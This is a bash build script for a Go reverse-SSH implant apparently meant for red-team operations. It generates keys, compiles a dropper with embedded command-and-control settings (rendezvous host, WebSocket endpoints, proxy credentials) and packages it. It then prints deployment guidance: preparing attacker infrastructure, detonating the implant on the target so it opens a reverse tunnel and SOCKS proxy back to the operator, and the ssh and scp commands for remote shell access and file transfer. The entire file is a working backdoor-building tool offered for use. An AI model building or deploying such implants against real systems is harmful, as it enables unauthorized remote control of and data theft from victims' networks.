#!/bin/bash

usage(){
    echo "Message: $2\n"
    echo "Usage: $1 [build.profile]\n"
    exit 1
}


if [[ $# -eq 0 ]]
then
    BUILDCONF="./build.profile"
else
    BUILDCONF=${1}
fi

if [[ -f  ${BUILDCONF} ]]
then
    source ${BUILDCONF}
else
    usage $0 "Cannot find build configuration"
fi


#------------------------- Build --------------------#
export GOOS=${DropperOS} GOARCH=${DropperArch}

TOP_DIR="/Users/dimas/Code/go/src/sshpipe"
TOOL_DIR="${TOP_DIR}/tools"
CODE_DIR="${TOP_DIR}/src"
OUT_DIR="${TOP_DIR}/out/${ImplantID}"

[[ ! -d ${OUT_DIR} ]] && mkdir ${OUT_DIR}
cd ${TOP_DIR}

printf "\n\n\t%s\n" "Cutting Implant ID ${ImplantID} for target (${DropperOS}/${DropperArch})"
printf "\n%s\n" "### PHASE I:  Implant Generation ###"
printf "%s\n\n" "------------------------------------"

echo "[*] Building Keys For ${ImplantID} "
go run ${TOOL_DIR}/keygen.go \
       -bits ${SSHServerUserKeyBits}  -pass ${SSHServerUserKeyPassphrase} \
       -pkfile ${SSHServerUserKeyFile}.pk \
       -pkfile-b64 ${SSHServerUserKeyFile}.bpk \
       -pubfile ${SSHServerUserKeyFile}.pub

if [[ $? -eq 0 ]]
then
    echo
    echo "[*] Building dropper ${ImplantID} (${DropperName}) for ${DropperOS} / ${DropperArch} "

    go build  -buildmode=${DropperBuildType} -ldflags \
	"-s -w \
     -X main.ImplantID=${ImplantID}  \
     -X main.SSHShell=${SSHShell}  \
     -X main.SSHEnvTerm=${SSHEnvTerm}  \
     -X main.SSHServerPort=${SSHServerPort}  \
     -X main.SSHServerHost=${SSHServerHost} \
     -X main.SSHServerUser=${SSHServerUser} \
     -X main.SSHServerUserKey=$( cat ${SSHServerUserKeyFile}.bpk ) \
     -X main.SSHServerUserKeyUrl=${SSHServerUserKeyUrl} \
     -X main.SSHServerUserKeyPassphrase=${SSHServerUserKeyPassphrase} \
     -X main.SSHRemoteCmdHost=${SSHRemoteCmdHost}  \
     -X main.SSHRemoteCmdPort=${SSHRemoteCmdPort} \
     -X main.SSHRemoteCmdUser=${SSHRemoteCmdUser} \
     -X main.SSHRemoteCmdPwd=${SSHRemoteCmdPwd} \
     -X main.SSHRemoteSocksHost=${SSHRemoteSocksHost} \
     -X main.SSHRemoteSocksPort=${SSHRemoteSocksPort} \
     -X main.HTTPProxyFromEnvironment=${HTTPProxyFromEnvironment} \
     -X main.HTTPProxy=${HTTPProxy} \
     -X main.HTTPProxyAuthUser=${HTTPProxyAuthUser} \
     -X main.HTTPProxyAuthPass=${HTTPProxyAuthPass} \
     -X main.HTTPEndpoint=${HTTPEndpoint} \
     -X main.WSEndpoint=${WSEndpoint} \
     -X main.LogFile=${LogFile} \
     -X main.PIDFile=${PIDFile}  \
     -X main.Daemonize=${Daemonize}" \
     -o ${OUT_DIR}/${DropperName} \
            ${CODE_DIR}/rssh.go  ${CODE_DIR}/types.go ${CODE_DIR}/vars.go \
            ${CODE_DIR}/pty.go ${CODE_DIR}/socksport.go ${CODE_DIR}/keymgmt.go \
            ${CODE_DIR}/traffic.go
else
    printf "    %s\n" "KeyGen unsuccessful"
    exit 2
fi

if [[ $? -eq 0 ]]
then

printf "\n\n%s\n\n" "**********************************************"
echo "Implant: ${DropperName} ($(stat -f '%z bytes' ${OUT_DIR}/${DropperName})) Generated"
echo "!!! Here is the info on Implant configuraton !!!"
echo "!!! Record the info somewhere safe and we have saved a copy here !!!"
echo "!!!     Implant Info: ${OUT_DIR}/${ImplantID}.info               !!!"
echo "!!! This info is mostly embedded in the Implant.                 !!!"
echo "!!! Again, save it, or you will need to regenerate the implant.  !!!"
printf "%s\n\n" "**********************************************"

printf "%s\n\n" "-------------- START INFO--------------"
cat<<END | tee ${OUT_DIR}/${ImplantID}.info
(Blue) Implant Egress HTTP Proxy Info
    +HTTP Proxy:(from env?) ${HTTPProxyFromEnvironment}
     HTTP Proxy: ${HTTPProxy}
     HTTP Proxy AuthUser ${HTTPProxyAuthUser}
     HTTP Proxy AuthPass ${HTTPProxyAuthPass+<masked>}

(Blue) Implant Execution Context
    Daemonize? ${Daemonize}
    PIDFile: ${PIDFile}
    LogFile (!! Debug locally !!): ${LogFile}
    SSHEnvTerm ${SSHEnvTerm}
    SSHShell ${SSHShell}

(Yellow/Red) Implant HTTP/WS/WSS Wrap Endpoints
    HTTP Endpoint: ${HTTPEndpoint}
    WS Endpoint: ${WSEndpoint}

(Yellow/Red) SSH Rendezvous Point:
    SSHServerHost=${SSHServerHost}
    SSHServerPort=${SSHServerPort}
    SSHServerUser=${SSHServerUser}

(Yellow/Red) SSH Key Hosting / Embedding:
    +SSHServerUserKeyFile=${SSHServerUserKeyFile}.bpk
    SSHServerUserKeyUrl=${SSHServerUserKeyUrl}
    SSHServerUserKeyPassphrase=${SSHServerUserKeyPassphrase}

(Red) RT Operator Interface to SSH Implant Channel:
    SSHRemoteCmdHost=${SSHRemoteCmdHost}
    SSHRemoteCmdPort=${SSHRemoteCmdPort}

(Red) RT Operator SSH Tunnel Usage and Authentication Info
    SSHRemoteCmdUser=${SSHRemoteCmdUser}
    SSHRemoteCmdPwd=${SSHRemoteCmdPwd}

(Red) RT Operator SOCKS Tunnel Usage Info:
    SSHRemoteSocksHost=${SSHRemoteSocksHost}
    SSHRemoteSocksPort=${SSHRemoteSocksPort}
END

printf "%s\n\n" "-------------- END INFO----------------"
echo "[*] Packaging ${ImplantID} for infrastructure deployment "

# pushd/popd not always available
cd  ${OUT_DIR}
tar -cvzf ${ImplantID}.tar.gz ./${ImplantID}.{pk,bpk,pub}
cd -

printf "\n\n%s\n\n" "**********************************************"
echo "Based on your build profile you can expect the following Deployment Plan"
printf "%s\n\n" "**********************************************"

printf "\n%s\n" "### PHASE II: Red Infra Prep Deployment Guidance ###"
printf "%s\n\n" "----------------------------------------------------"
cat<<END
A. If you have chosen to fetch armored SSH key from external Yellow/Red hosting, please host  ${SSHServerUserKeyFile}.bpk on your HTTP server. The key is encrypted, passworded and B64 protected. You can leave it on clear storage and use plaintext transmission. The implant will take care of the rest.

B.You will need to create user ${SSHServerUser} on SSH server where you want Implant to terminate the reverse tunnel on Red network. Refer to scripts in infra directory. SSH keys for the would be user are pregenerated:  ${SSHServerUserKeyFile}.pk and  ${SSHServerUserKeyFile}.pub. You need to place them in .ssh directory as per usual SSH access setup (mind the permissions on keys and .ssh directory)

 A/B Note: For your convenience we have created a package ${OUT_DIR}/${ImplantID}.tar.gz containing SSH Keys (${ImplantID}.{pk,bpk,pub}). You can use tools/install_implant.sh to automate the steps.

C. You will need to stand up an WSS unwrap service on Yellow/Red side. Refer to infra/wss2ssh_tun.sh script to help you with that.
END

printf "\n%s\n" "### PHASE III: Blue Detonation and Connect back ###"
printf "%s\n\n" "---------------------------------------------------"
cat<<END

    0. Get the Implant on the Blue system detonate.
    1. Implant ${ImplantID} connects to WS Endpoint ${WSEndpoint}
        which unwraps to SSH tunnel ${SSHServerHost}:${SSHServerPort} Red rendezvous

    2. Implant authenticates to SSH rendezvous with RSA PK in ${SSHServerUserKeyFile}.pk wrapped for transmission as ${SSHServerUserKeyFile}.bpk as SSH/OS user ${SSHServerUser}

    3. Once authenticated the Implant opens up reverse SSH tunnel to Blue network and also stands up two ports on the Red side for convenience:
        - SSH command port ${SSHRemoteCmdPort}
        - SOCKS ${SSHRemoteSocksPort} port used for proxying Red traffic over the channel to the implant to exit on Blue network

END

printf "\n%s\n" "### PHASE IV: RTO Guidance ###"
printf "%s\n\n" "-----------------------------------------------"
cat<<END
RTOs can connect to the new implant channel by connecting to Red rendezvous ports exposed by the implant on Red network.

Examples:
    For SSH interactive shell: ssh ${SSHRemoteCmdUser}@${SSHRemoteCmdHost} -p ${SSHRemoteCmdPort}
    For SSH batch exec: ssh ${SSHRemoteCmdUser}@${SSHRemoteCmdHost} -p ${SSHRemoteCmdPort} /path/command/on/blue
    For SCP: scp -P ${SSHRemoteCmdPort} /path/to/file/on/red  ${SSHRemoteCmdUser}@${SSHRemoteCmdHost}:/path/to/file/on/blue"

Note: To use SOCKS in browser point browser to ${SSHRemoteSocksHost}:${SSHRemoteSocksPort} or for system wide coverage use proxychains with the same configuration
END
else
    printf "    %s\n" "Implant build unsuccessful"
    exit 3
fi

printf "%s\n" "-----------------End Transmission -----------------"
printf "\n%s\n" "Good luck!"


# upx --brute ./rssh
# 7.1 vs. 1.7 mb
